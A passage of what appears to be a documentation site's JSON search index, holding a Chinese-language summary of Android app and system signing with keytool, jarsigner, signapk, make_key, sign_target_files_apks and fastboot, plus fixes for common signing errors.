.pk8\u7684\u5bc6\u94a5\u5bf9\u3002 2.\u7528make_key\u751f\u6210\u7684\u5bc6\u94a5\u5bf9\uff0c\u5bf9apk\u8fdb\u884c\u624b\u52a8\u7b7e\u540d\uff1a \u901a\u8fc7signapk.jar \u5de5\u5177\u5bf9apk\u7b7e\u540d\uff0c\u7528\u6cd5\uff1asignapk [-w] publickey.x509[.pem] privatekey.pk8 input.jar output.jar java -jar out/host/linux-x86/framework/signapk.jar releasekey.x509.pem releasekey.pk8 source.zip source-signed.zip signapk.jar\u53ef\u4ee5\u81ea\u5df1\u7f16\u8bd1\uff0c\u6e90\u7801\u5728build/tools/signapk\u76ee\u5f55\u4e0b\u3002 3.android\u6e90\u7801\u7f16\u8bd1make \u65f6\uff0c\u5bf9\u6240\u6709\u5e94\u7528\u7b7e\u540d\u89c4\u5219\uff1a \u7cfb\u7edf\u5728\u7f16\u8bd1\u7684\u65f6\u5019\uff0c\u8bfb\u53d6build/core/package.mk\u6587\u4ef6\uff0c\u6839\u636eLOCAL_CERTIFICATE\u7684\u503c\u5728build/target/product/security/\u76ee\u5f55\u4e0b\u9009\u62e9\u76f8\u5e94\u7684\u7b7e\u540d\u3002LOCAL_CERTIFICATE\u503c\u4ece\u5404\u5e94\u7528\u7684Android.mk\u6587\u4ef6\u4e2d\u8bfb\u53d6\uff0c\u5982\u679cAndroid.mk\u6587\u4ef6\u4e2d\u6ca1\u6709\u8be5\u5c5e\u6027\uff0c\u5219\u9ed8\u8ba4\u4e3atestkey\u3002 \u516d\u3001\u5e38\u89c1\u5f02\u5e38\uff1a 1.\u5982\u679c\u9047\u5230\u4e86ZipException invalid entry compressed size\u7684\u9519\u8bef\u65b9\u6cd5 \u4e3b\u8981\u539f\u56e0\u662f\u5e73\u65f6Eclipse\u4f7f\u7528\u7684ADT\u63d2\u4ef6\u5df2\u7ecf\u8d4b\u4e88\u4e86DEBUG\u6743\u9650\u7684\u6570\u5b57\u7b7e\u540d\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5bfc\u51fa\u4e00\u4e2a\u672a\u7b7e\u540d\u7684APK\u6587\u4ef6\u5c31\u53ef\u4ee5\u89e3\u51b3\u3002 2.\u4f7f\u7528jarsigner\u5de5\u5177\u6765\u7b7e\u540d\uff0c\u51fa\u73b0\u65e0\u6cd5\u5bf9jar \u8fdb\u884c\u7b7e\u540d\uff1ajava.util.zip.ZipException: invalid entry compressed size (expected xxx but got xxx bytes)\u8fd9\u6837\u7684\u63d0\u793a\u3002 \u8fd9\u4e9b\u95ee\u9898\u4e3b\u8981\u662f\u7531\u4e8e\u8d44\u6e90\u6587\u4ef6\u9020\u6210\u7684\uff0c\u5bf9\u4e8eandroid\u5f00\u53d1\u6765\u8bf4\u5e94\u8be5\u68c0\u67e5res\u6587\u4ef6\u5939\u4e2d\u7684\u6587\u4ef6\uff0c\u9010\u4e2a\u6392\u67e5\u3002\u8fd9\u4e2a\u95ee\u9898\u53ef\u4ee5\u901a\u8fc7\u5347\u7ea7\u7cfb\u7edf\u7684JDK\u548cJRE\u7248\u672c\u6765\u89e3\u51b3\u3002 3.\u5b89\u88c5apk\u8fc7\u7a0b\u4e2d\u51fa\u73b0\uff1aINSTALL_PARSE_FAILED_INCONSISTENT_CERTIFICATES\u3002 \u8fd9\u6837\u7684\u95ee\u9898\u4e3b\u8981\u662f\u7b7e\u540d\u51b2\u7a81\u9020\u6210\u7684\uff0c\u6bd4\u5982\u4f60\u4f7f\u7528\u4e86ADB\u7684debug\u6743\u9650\u7b7e\u540d\uff0c\u4f46\u540e\u6765\u4f7f\u7528\u6807\u51c6sign\u7b7e\u540d\u540e\u518d\u5b89\u88c5\u540c\u4e00\u4e2a\u6587\u4ef6\u4f1a\u51fa\u73b0\u8fd9\u6837\u7684\u9519\u8bef\u63d0\u793a\uff0c\u89e3\u51b3\u7684\u65b9\u6cd5\u53ea\u6709\u5148\u8001\u8001\u5b9e\u5b9e\u4ece\u624b\u673a\u4e0a\u5378\u8f7d\u539f\u6709\u7248\u672c\u518d\u8fdb\u884c\u5b89\u88c5\uff0c\u800cadb install -r\u53c2\u6570\u4e5f\u65e0\u6cd5\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002adb uninstall \u5378\u8f7d\u539f\u6765\u7684\u5e94\u7528\u3002 \u539f\u6587\u94fe\u63a5\uff1a https://www.cnblogs.com/wanqieddy/p/3556060.html","title":"Android\u7b7e\u540d\u603b\u7ed3"},{"location":"Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/#android","text":"signapk.jar\u4e0eeclipse export\u63d2\u4ef6\u9ed8\u8ba4\u8d4b\u4e88\u7a0b\u5e8f\u4e00\u4e2aDEBUG\u6743\u9650\u7684\u7b7e\u540d signapk.jar\u5305\u542b\u6709\u7cfb\u7edf\u6743\u9650\uff08system api, permission\uff09\uff0c\u800ceclipse export\u63d2\u4ef6\u9ed8\u8ba4\u8d4b\u4e88\u7a0b\u5e8f\u4e00\u4e2aDEBUG\u6743\u9650\u7684\u7b7e\u540d\u3002 D:\\work_feixun\\GalleryBack>java -jar signapk.jar platform.x509.pem platform.pk8 D:\\work_feixun\\Gallery2\\bin\\Gallery.apk Gallery_signed.apk \u6ce8\uff1a signapk.jar \u4f4d\u4e8e out/host/linux-86/framework/signapk.jar platform.x509.pem platform.pk8 \u4f4d\u4e8e build/target/product/security/platform.x509.pem, platform.pk8 Gallery.apk\u7684\u751f\u6210\uff0c\u5148\u5728eclipse\u4e2d\u5bf9project->clean\uff0c\u7136\u540e run ->android application.\u5728bin\u76ee\u5f55\u4e0b\u4f1a\u751f\u6210Gallery.apk\u3002 \u6700\u540e D:\\work_feixun\\GalleryBack>java -jar signapk.jar platform.x509.pem platform.pk8 D:\\work_feixun\\Gallery2\\bin\\Gallery.apk Gallery_signed.apk \u8fd9\u6837\u5305\u542b\u6709\u7cfb\u7edf\u6743\u9650\u7684\u7b7e\u540dapk\u5c31\u5b8c\u6210\u4e86\u3002 \u6211\u662f\u5728AndroidManifast\u4e2d\u6dfb\u52a0android.permission.WRITE_MEDIA_STORAGE\u65f6\u51fa\u73b0 permission is only granted to system apps. from: http://blog.csdn.net/tangmin0719/article/details/8916417","title":"Android\u7b7e\u540d\u603b\u7ed3"},{"location":"Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/#_1","text":"\u5f00\u53d1Android\u7684\u4eba\u8fd9\u4e48\u591a\uff0c\u5b8c\u5168\u6709\u53ef\u80fd\u5927\u5bb6\u90fd\u628a\u7c7b\u540d\uff0c\u5305\u540d\u8d77\u6210\u4e86\u4e00\u4e2a\u540c\u6837\u7684\u540d\u5b57\uff0c\u8fd9\u65f6\u5019\u5982\u4f55\u533a\u5206\uff1f\u7b7e\u540d\u8fd9\u65f6\u5019\u5c31\u662f\u8d77\u533a\u5206\u4f5c\u7528\u7684\u3002 \u7531\u4e8e\u5f00\u53d1\u5546\u53ef\u80fd\u901a\u8fc7\u4f7f\u7528\u76f8\u540c\u7684Package Name\u6765\u6df7\u6dc6\u66ff\u6362\u5df2\u7ecf\u5b89\u88c5\u7684\u7a0b\u5e8f\uff0c\u7b7e\u540d\u53ef\u4ee5\u4fdd\u8bc1\u76f8\u5f53\u540d\u5b57\uff0c\u4f46\u662f\u7b7e\u540d\u4e0d\u540c\u7684\u5305\u4e0d\u88ab\u66ff\u6362\u3002 APK\u5982\u679c\u4f7f\u7528\u4e00\u4e2akey\u7b7e\u540d\uff0c\u53d1\u5e03\u65f6\u53e6\u4e00\u4e2akey\u7b7e\u540d\u7684\u6587\u4ef6\u5c06\u65e0\u6cd5\u5b89\u88c5\u6216\u8986\u76d6\u8001\u7684\u7248\u672c\uff0c\u8fd9\u6837\u53ef\u4ee5\u9632\u6b62\u4f60\u5df2\u5b89\u88c5\u7684\u5e94\u7528\u88ab\u6076\u610f\u7684\u7b2c\u4e09\u65b9\u8986\u76d6\u6216\u66ff\u6362\u6389\u3002 \u8fd9\u6837\u7b7e\u540d\u5176\u5b9e\u4e5f\u662f\u5f00\u53d1\u8005\u7684\u8eab\u4efd\u6807\u8bc6\u3002\u4ea4\u6613\u4e2d\u62b5\u8d56\u7b49\u4e8b\u60c5\u53d1\u751f\u65f6\uff0c\u7b7e\u540d\u53ef\u4ee5\u9632\u6b62\u62b5\u8d56\u7684\u53d1\u751f\u3002","title":"\u4e00\u3001\u4e3a\u4ec0\u4e48\u8981\u7b7e\u540d"},{"location":"Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/#_2","text":"Android \u7cfb\u7edf\u8981\u6c42\u6240\u6709\u7684\u7a0b\u5e8f\u7ecf\u8fc7\u6570\u5b57\u7b7e\u540d\u624d\u80fd\u5b89\u88c5\uff0c\u5982\u679c\u6ca1\u6709\u53ef\u7528\u7684\u6570\u5b57\u7b7e\u540d\uff0c\u7cfb\u7edf\u5c06\u4e0d\u8bb8\u5b89\u88c5\u8fd0\u884c\u6b64\u7a0b\u5e8f\u3002\u4e0d\u7ba1\u662f\u6a21\u62df\u5668\u8fd8\u662f\u771f\u5b9e\u624b\u673a\u3002\u56e0\u6b64\uff0c\u5728\u8bbe\u5907\u6216\u8005\u662f\u6a21\u62df\u5668\u4e0a\u8fd0\u884c\u8c03\u8bd5\u7a0b\u5e8f\u4e4b\u524d\uff0c\u5fc5\u987b\u4e3a\u5e94\u7528\u7a0b\u5e8f\u8bbe\u7f6e\u6570\u5b57\u7b7e\u540d\u3002 Android\u7b7e\u540d\u7684\u6570\u5b57\u8bc1\u4e66\u4e0d\u9700\u8981\u6743\u5a01\u673a\u6784\u6765\u8ba4\u8bc1\uff0c\u662f\u5f00\u53d1\u8005\u81ea\u5df1\u4ea7\u751f\u7684\u6570\u5b57\u8bc1\u4e66\uff0c\u5373\u6240\u8c13\u7684\u81ea\u7b7e\u540d\u3002\u6570\u5b57\u8bc1\u4e66\u7528\u6765\u6807\u8bc6\u5e94\u7528\u7a0b\u5e8f\u7684\u4f5c\u8005\u548c\u5728\u5e94\u7528\u7a0b\u5e8f\u4e4b\u95f4\u5efa\u7acb\u4fe1\u4efb\u5173\u7cfb\uff0c\u800c\u4e0d\u662f\u7528\u6765\u51b3\u5b9a\u6700\u7ec8\u7528\u6237\u53ef\u4ee5\u5b89\u88c5\u54ea\u4e9b\u5e94\u7528\u7a0b\u5e8f\u3002 \u7cfb\u7edf\u4ec5\u4ec5\u4f1a\u5728\u5b89\u88c5\u7684\u65f6\u5019\u6d4b\u8bd5\u7b7e\u540d\u8bc1\u4e66\u7684\u6709\u6548\u671f\uff0c\u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u7684\u7b7e\u540d\u662f\u5728\u5b89\u88c5\u4e4b\u540e\u624d\u5230\u671f\uff0c\u90a3\u4e48\u5e94\u7528\u7a0b\u5e8f\u4ecd\u7136\u53ef\u4ee5\u6b63\u5e38\u542f\u7528\u3002 \u53ef\u4ee5\u4f7f\u7528\u6807\u51c6\u5de5\u5177-Keytool and Jarsigner-\u751f\u6210\u5bc6\u94a5\uff0c\u6765\u7b7e\u540d\u5e94\u7528\u7a0b\u5e8f\u7684.apk\u6587\u4ef6\u3002 \u7b7e\u540d\u540e\u9700\u4f7f\u7528zipalign\u4f18\u5316\u7a0b\u5e8f\u3002 \u6a21\u62df\u5668\u5f00\u53d1\u73af\u5883\uff0c\u5f00\u53d1\u65f6\u901a\u8fc7ADB\u63a5\u53e3\u4e0a\u4f20\u7684\u7a0b\u5e8f\u4f1a\u5148\u81ea\u52a8\u88ab\u7b7e\u6709Debug\u6743\u9650\uff0c\u7136\u540e\u624d\u4f20\u9012\u5230\u6a21\u62df\u5668\u3002Eclipse\u83dc\u5355\u7684Window -> Preferences -> Android \u2013> Build \u4e0b\u663e\u793a\u7684\u662f\u6211\u4eec\u9ed8\u8ba4\u7684\u8c03\u8bd5\u7528\u7684\u7b7e\u540d\u6570\u5b57\u8bc1\u4e66\u3002 \u6b63\u5f0f\u53d1\u5e03\u4e00\u4e2aAndroid\u5e94\u7528\u65f6\uff0c\u5fc5\u987b\u4f7f\u7528\u4e00\u4e2a\u5408\u9002\u7684\u79c1\u94a5\u751f\u6210\u7684\u6570\u5b57\u8bc1\u4e66\u6765\u7ed9\u7a0b\u5e8f\u7b7e\u540d\uff0c\u4e0d\u80fd\u4f7f\u7528ADT\u63d2\u4ef6\u6216\u8005ANT\u5de5\u5177\u751f\u6210\u7684\u8c03\u8bd5\u8bc1\u4e66\u6765\u53d1\u5e03\u3002","title":"\u4e8c\u3001\u7b7e\u540d\u7684\u6ce8\u610f\u4e8b\u9879"},{"location":"Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/#_3","text":"","title":"\u4e09\u3001\u7b7e\u540d\u65b9\u6cd5\uff1a"},{"location":"Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/#1keytool-jarsignerjdkbin","text":"","title":"1.\u4f7f\u7528Keytool\u00a0\u548cjarsigner\u5de5\u5177\u7b7e\u540d\uff08\u5728jdk/bin\u76ee\u5f55\u4e0b\uff09"},{"location":"Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/#1keystore","text":"\u786e\u4fdd\u7535\u8111\u4e0a\u5b89\u88c5\u4e86JDK\uff0c\u56e0\u4e3a\u6211\u4eec\u5c06\u4f7f\u7528JDK\u81ea\u5e26\u7684\u521b\u5efa\u548c\u7ba1\u7406\u6570\u5b57\u8bc1\u4e66\u7684\u5de5\u5177Keytool\u3002\u5728\u547d\u4ee4\u884c\u4e0b\u8f93\u5165\u5982\u4e0b\u547d\u4ee4\uff1a keytool -genkey -v -keystore app.keystore -alias alias_name -keyalg RSA -validity 20000 -alias \u540e\u9762\u8ddf\u7684\u662f\u522b\u540d\u8fd9\u91cc\u662falias_name -keyalg \u662f\u52a0\u5bc6\u65b9\u5f0f\u8fd9\u91cc\u662fRSA -validity \u662f\u6709\u6548\u671f\u8fd9\u91cc\u662f20000 -keystore \u5c31\u662f\u8981\u751f\u6210\u7684keystore\u7684\u540d\u79f0\u8fd9\u91cc\u662fapp.keystore \u7136\u540e\u6309\u56de\u8f66\u952e \u6309\u56de\u8f66\u540e\u9996\u5148\u4f1a\u63d0\u793a\u4f60\u8f93\u5165\u7684\u5bc6\u7801\uff1a\u8fd9\u4e2a\u5728\u7b7e\u540d\u65f6\u8981\u7528\u7684\uff0c\u8981\u8bb0\u4f4f \u7136\u540e\u4f1a\u518d\u786e\u8ba4\u4f60\u7684\u5bc6\u7801\u3002 \u4e4b\u540e\u4f1a\u4f9d\u6b21\u53eb\u4f60\u8f93\u5165\u59d3\u540d\u3001\u7ec4\u7ec7\u5355\u4f4d\u3001\u7ec4\u7ec7\u540d\u79f0\u3001\u57ce\u5e02\u533a\u57df\u3001\u7701\u4efd\u540d\u79f0\u3001\u56fd\u5bb6\u4ee3\u7801\uff08CN\uff09\u7b49\u3002 Keytool\u7684\u8be6\u7ec6\u53c2\u6570\u8bf7\u53c2\u8003\uff1a http://www.android123.com.cn/androidkaifa/173.html","title":"1.\u751f\u6210\u7b7e\u540dkeystore\uff1a"},{"location":"Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/#2","text":"jarsigner -verbose -keystore app.keystore -signedjar app_signed.apk app.apk alias_name -keystore: keystore\u7684\u540d\u79f0 -signedjar app_signed.apk: \u6307\u5b9a\u7b7e\u540d\u540e\u751f\u6210\u7684APK\u540d\u79f0 app.apk: \u76ee\u6807APK \u7136\u540e\u6309\u56de\u8f66\uff1a\u4f1a\u8981\u6c42\u8f93\u5165\u521a\u624d\u8bbe\u7f6e\u7684\u5bc6\u7801\uff0c\u8f93\u5165\u540e\u6309\u56de\u8f66\u5c31\u5f00\u59cb\u7b7e\u540d\u4e86\u3002","title":"2.\u7b7e\u540d\uff1a"},{"location":"Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/#3","text":"jarsigner -verify app_signed.apk \u67e5\u770b\u662f\u5426\u7b7e\u540d\uff0c\u5982\u679c\u5df2\u7ecf\u7b7e\u540d\u4f1a\u6253\u5370 \"jar verified\". jarsigner -verify -verbose -certs app_signed.apk \u67e5\u770b\u7b7e\u540d\u8be6\u7ec6\u4fe1\u606f\u3002","title":"3.\u67e5\u770b\u7b7e\u540d\uff1a"},{"location":"Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/#4zipalignapkandroidbuildtoolszipalign","text":"zipalign -v 4 app_signed.apk androidres.apk # \u5bf9apk\u4f18\u5316 zipalign -c -v 4 androidres.apk # \u67e5\u770bapk\u662f\u5426\u7ecf\u8fc7\u4f18\u5316","title":"4.\u901a\u8fc7zipalign\u5de5\u5177\u8fdb\u884c\u4f18\u5316apk(android\u81ea\u5e26\u7684\u5de5\u5177\uff0c./build/tools/zipalign)"},{"location":"Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/#2eclipse-adt","text":"\u5728Package Explorer \u7a97\u53e3\uff0c\u53f3\u952e\uff0c\u9009\u62e9Android Tools--->Export Signed Application Package \u7136\u540e\u6309\u7167\u63d0\u793a\u4e00\u6b65\u4e00\u6b65\uff0c\u751f\u6210\u5df2\u7b7e\u540d\u7684apk\u3002\u901a\u8fc7eclipse\u4e5f\u53ef\u4ee5 \u5bfc\u51fa\u672a\u7b7e\u540d\u7684APK\u6587\u4ef6\u3002 \u6ce8\uff1a\u9700\u8981\u8f93\u5165\u4e24\u6b21\u5bc6\u7801\uff0c\u7b2c\u4e00\u6b21\u662f\u79c1\u94a5\u5bc6\u7801\uff0c\u7b2c\u4e8c\u6b21\u65f6\u79c1\u94a5\u522b\u540d\u7684\u5bc6\u7801\u3002","title":"2.\u4f7f\u7528eclipse ADT\u5de5\u5177\u7b7e\u540d"},{"location":"Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/#3eclipsedebug","text":"\u5728debug\u6a21\u5f0f\u4e0b\u7528eclipse \u7684ADT\u4e3aandroid\u7b7e\u540d\uff0c\u53ea\u8981\u5e94\u7528\u7a0b\u5e8f\u5728eclipse\u4e0b\u5f00\u53d1\uff0c\u7cfb\u7edf\u5c31\u4f1a\u81ea\u52a8\u7ed9apk\u7b7e\u540d\u548c\u4f18\u5316\u3002 \u5728Eclipse\u4e2dWindows > Preferences > Android > Build\u53ef\u4ee5\u770b\u5230\u4f60keysotre\u7684\u4f4d\u7f6e\uff1b","title":"3.eclipse\u5728debug\u6a21\u5f0f\u4e0b\u81ea\u52a8\u7b7e\u540d\uff08\u65e0\u987b\u624b\u52a8\u914d\u7f6e\uff09\uff1a"},{"location":"Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/#android_1","text":"\u4e0a\u9762\u8bb2\u7684Android\u6570\u5b57\u7b7e\u540d\u5927\u591a\u662f\u4e0eAndroid APK\u76f8\u5173\uff0c\u505aCTS \u8ba4\u8bc1\u65f6\uff0c\u9700\u8981\u7528\u5230Android\u7cfb\u7edf\u7b7e\u540d\u3002\u4e3a\u4ec0\u4e48\u9700\u8981\u7ed9Android\u7cfb\u7edf\u7b7e\u4e2a\u540d\u624d\u80fd\u8fdb\u884cCTS\u8ba4\u8bc1\u5462\uff1f\u539f\u6765\u6211\u4eec\u901a\u8fc7make -j4\u7f16\u8bd1\u51fa\u6765\u7684system.img\u4f7f\u7528\u7684\u662ftest key,\u8fd9\u79cd\u7c7b\u578b\u7684key\u53ea\u9002\u7528\u4e8e\u5f00\u53d1\u9636\u6bb5\uff0c\u800c\u4e14\u8fd9\u79cd\u79d8\u94a5\u662f\u516c\u5f00\u7684\uff0c\u8c01\u90fd\u53ef\u4ee5\u4f7f\u7528\u3002\u5f53\u53d1\u5e03\u4e00\u6b3eandroid\u4ea7\u54c1\uff0c\u5c31\u9700\u8981\u53e6\u5916\u7ed9\u6574\u4e2a\u7cfb\u7edf\u7b7e\u4e2a\u540d\uff0c\u9632\u6b62\u88ab\u522b\u4eba\u76d7\u7528\u3002\u8fd9\u79cd\u7cfb\u7edf\u5c31\u662frelease\u7248\u672c\u7684Android\u7cfb\u7edf\u3002","title":"\u56db\u3001\u751f\u6210Android\u7cfb\u7edf\u7b7e\u540d"},{"location":"Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/#1key","text":"\u8981\u5bf9Android\u7cfb\u7edf\u8fdb\u884c\u7b7e\u540d\uff0c\u9700\u8981\u751f\u6210\u56db\u79cd\u7c7b\u578b\u7684key\u6587\u4ef6\u3002 a)releasekey \uff08testkey\uff09 b)media c)shared d)platform 1\uff09\u8fdb\u5165/android_src/development/tools\u76ee\u5f55\u3002 2\uff09\u4f7f\u7528make_key\u5de5\u5177\u751f\u6210\u7b7e\u540d\u6587\u4ef6\u3002\u9700\u8981\u5206\u522b\u751f\u6210 releasekey\uff0cmedia\uff0cshared\uff0cplatform\u3002 ./make_key releasekey '/C=CN/ST=JiangSu/L=NanJing/O=Company/OU=Department/CN=Your Name/emailAddress=YourE-mailAddress' \uff08\u7cfb\u7edf\u5c06\u4f1a\u63d0\u793a\u8f93\u5165\u9488\u5bf9\u5404\u79cdkey\u7684\u5bc6\u7801\uff0c\u6309\u7167\u63d0\u793a\u8f93\u5165\u5373\u53ef\uff09 \u5c06\u4f1a\u751f\u6210 releasekey.pk8 \u548c releasekey.x509.pem\u6587\u4ef6\uff0c\u5176\u4e2d .pk8\u662f\u751f\u6210\u7684\u79c1\u94a5\uff0c\u800c .x509.pem\u662f\u516c\u94a5\uff0c\u751f\u6210\u65f6\u4e24\u8005\u662f\u6210\u5bf9\u51fa\u73b0\u7684. \u6ce8\uff1a\u5982\u679c\u51fa\u73b0 openssl : relocation error :openssl : symbol ...\u5c1d\u8bd5\u7528 sudo \u6267\u884c\u547d\u4ee4\uff0c\u95ee\u9898\u89e3\u51b3\u4e86\uff01","title":"1\u3001\u751f\u6210\u52a0\u5bc6key\u6587\u4ef6"},{"location":"Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/#2android_src","text":"\u547d\u4ee4\u6267\u884c\u7684\u65f6\u5019\u90fd\u6700\u597d\u5728\u5de5\u7a0b\u7684\u6839\u76ee\u5f55\u4e0b\u6267\u884c\uff0c\u8981\u4e0d\u7136\u811a\u672c\u7528\u5230\u7684\u67d0\u4e9b\u6587\u4ef6\u627e\u4e0d\u5230\u7684\u3002","title":"2.\u56de\u5230\u6839\u76ee\u5f55android_src\u3002"},{"location":"Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/#3_1","text":"make -j4 PRODUCT-generic-user dist \u5176\u4e2dgeneric \u8868\u793a\u751f\u6210\u7684TARGET_PRODUCT\u7c7b\u578b\u4e3ageneric\uff0c user\u4ee3\u8868TARGET_BUILD_VARIANT\u4e3auser\u7248\u672c\u3002 \u7f16\u8bd1\u5b8c\u6210\u4e4b\u540e\u56de\u5728android_src/dist/\u76ee\u5f55\u5185\u751f\u6210\u4e2a product_generic-user_files \u5f00\u5934\u7684zip\u6587\u4ef6.\u8fd9\u5c31\u662f\u6211\u4eec\u9700\u8981\u8fdb\u884c\u7b7e\u540d\u7684\u6587\u4ef6\u7cfb\u7edf.","title":"3.\u7f16\u8bd1\u7cfb\u7edf"},{"location":"Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/#4","text":"./build/tools/releasetools/sign_target_files_apks -d key_directory/ out/dist/product_modul-target_files.zip out/dist/signed_target_files.zip \u901a\u8fc7 sign_target_files_apks \u811a\u672c\uff0c\u5b8c\u6210android\u7cfb\u7edf\u7684\u7b7e\u540d\u5de5\u4f5c. key_directory/ \u8868\u793akey\u6240\u5728\u7684\u76ee\u5f55\u3002 out/dist/product_modul-target_files.zip \u6e90\u6587\u4ef6\u3002 out/dist/signed_target_files.zip \u751f\u6210\u7b7e\u540d\u7684\u76ee\u6807\u6587\u4ef6\u3002 \u53ef\u80fd\u4f1a\u51fa\u73b0\uff1a ERROR: no key specified for: CalendarWidget.apk Contacts_yellowpage.apk SnsAppMain.apk \u8fd9\u8868\u793a\uff0c\u7b7e\u540d\u5e76\u6ca1\u6709\u6210\u529f,\u539f\u56e0\u662f\u7531\u4e8e\u6709\u4e9bapk\u7a0b\u5e8f\u5df2\u7ecf\u7b7e\u8fc7\u540d\u4e86\u6216\u8005\u627e\u4e0d\u5230\u5bf9\u5e94\u7684key. \u8fd9\u9700\u8981\u6211\u4eec\u5bf9apk\u8bbe\u7f6e\u8fc7\u6ee4,\u4e0d\u5bf9\u4e0a\u9762\u7684\u5e94\u7528\u8fdb\u884c\u7b7e\u540d.\u65b9\u6cd5\u5982\u4e0b: \u901a\u8fc7\u53c2\u6570\"-e =\" \u6765\u8fc7\u6ee4\u8fd9\u4e9b\u5e94\u7528. ./build/tools/releasetools/sign_target_files_apks -d key_directory/ -e CalendarWidget.apk= -e Contacts_yellowpage.apk= -e SnsAppMain.apk= -e out/dist/product_modul-target_files.zip out/dist/signed_target_files.zip \u8f93\u5165\u8be5\u547d\u4ee4\u65f6\u4f1a\u63d0\u793a\u8f93\u5165key\u7684\u5bc6\u7801\uff0c\u4f1a\u51fa\u73b0\u56db\u6b21\u5bc6\u7801\u8f93\u5165\u63d0\u793a\u3002\u5206\u522b\u4e3a\u56db\u79cd\u7c7b\u578b\u7684key\u7684\u5bc6\u7801\u3002","title":"4.\u5f00\u59cb\u7b7e\u540d"},{"location":"Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/#5image","text":"./build/tools/releasetools/img_from_target_files out/dist/signed-target-files.zip signed-img.zip \u7528 img_from_target_files \u547d\u4ee4\u5bf9\u751f\u6210\u7684igned-target-files.zip\u6587\u4ef6\u8fdb\u884c\u6253\u5305\uff0csigned-img.zip\u5305\u542b\u4e86boot.img,userdate.img,system.img\u6587\u4ef6\u7b49.","title":"5.\u751f\u6210image\u6587\u4ef6"},{"location":"Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/#6fastbootsigned-imgzip","text":"fastboot update signed-img.zip \u901a\u8fc7fastboot\u5c31\u53ef\u4ee5\u628a\u7b7e\u4e86\u540d\u7684\u7cfb\u7edf\u6587\u4ef6\u70e7\u5230\u624b\u673a\u4e0a\u4e86\u3002","title":"6.\u901a\u8fc7fastboot\u4e0b\u8f7dsigned-img.zip\u6587\u4ef6"},{"location":"Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/#_4","text":"1.make_key \u548cKeytool\u4e24\u79cd\u65b9\u5f0f\u751f\u6210\u7684key\u6709\u4f55\u533a\u522b\uff1a Keytool \u4f4d\u4e8e%JAVA_HOME%/bin\u76ee\u5f55\u4e0b\uff0c\u7528\u4e8e\u7ba1\u7406\u5bc6\u94a5\u3001\u8bc1\u4e66\u548c\u8bc1\u4e66\u94fe\u3002JavaSE6\u4e2d\u7684Keytool\u5df2\u7ecf\u6539\u53d8\uff0c\u8fd8\u53ef\u4ee5\u7528\u6765\u7ba1\u7406\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u4e2d\u7684\u5bc6\u94a5\u3002\u5b83\u751f\u6210\u7684mykey.keystore\u5305\u62ec\u516c\u94a5\u3001\u79c1\u94a5\u548c\u8bc1\u4e66\u3002 make_key \u4f4d\u4e8esource_src/development/tools \u76ee\u5f55\u4e0b\uff0c\u901a\u8fc7\u8c03\u7528openssh\u751f\u6210\u516c\u94a5\u548c\u79c1\u94a5\uff0c\u6240\u4ee5\u751f\u6210 .x509.pem\u548c .pk8\u7684\u5bc6\u94a5\u5bf9\u3002 2.\u7528make_key\u751f\u6210\u7684\u5bc6\u94a5\u5bf9\uff0c\u5bf9apk\u8fdb\u884c\u624b\u52a8\u7b7e\u540d\uff1a \u901a\u8fc7signapk.jar \u5de5\u5177\u5bf9apk\u7b7e\u540d\uff0c\u7528\u6cd5\uff1asignapk [-w] publickey.x509[.pem] privatekey.pk8 input.jar output.jar java -jar out/host/linux-x86/framework/signapk.jar releasekey.x509.pem releasekey.pk8 source.zip source-signed.zip signapk.jar\u53ef\u4ee5\u81ea\u5df1\u7f16\u8bd1\uff0c\u6e90\u7801\u5728build/tools/signapk\u76ee\u5f55\u4e0b\u3002 3.android\u6e90\u7801\u7f16\u8bd1make \u65f6\uff0c\u5bf9\u6240\u6709\u5e94\u7528\u7b7e\u540d\u89c4\u5219\uff1a \u7cfb\u7edf\u5728\u7f16\u8bd1\u7684\u65f6\u5019\uff0c\u8bfb\u53d6build/core/package.mk\u6587\u4ef6\uff0c\u6839\u636eLOCAL_CERTIFICATE\u7684\u503c\u5728build/target/product/security/\u76ee\u5f55\u4e0b\u9009\u62e9\u76f8\u5e94\u7684\u7b7e\u540d\u3002LOCAL_CERTIFICATE\u503c\u4ece\u5404\u5e94\u7528\u7684Android.mk\u6587\u4ef6\u4e2d\u8bfb\u53d6\uff0c\u5982\u679cAndroid.mk\u6587\u4ef6\u4e2d\u6ca1\u6709\u8be5\u5c5e\u6027\uff0c\u5219\u9ed8\u8ba4\u4e3atestkey\u3002","title":"\u4e94\u3001\u51e0\u4e2a\u95ee\u9898\uff1a"},{"location":"Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/#_5","text":"1.\u5982\u679c\u9047\u5230\u4e86ZipException invalid entry compressed size\u7684\u9519\u8bef\u65b9\u6cd5 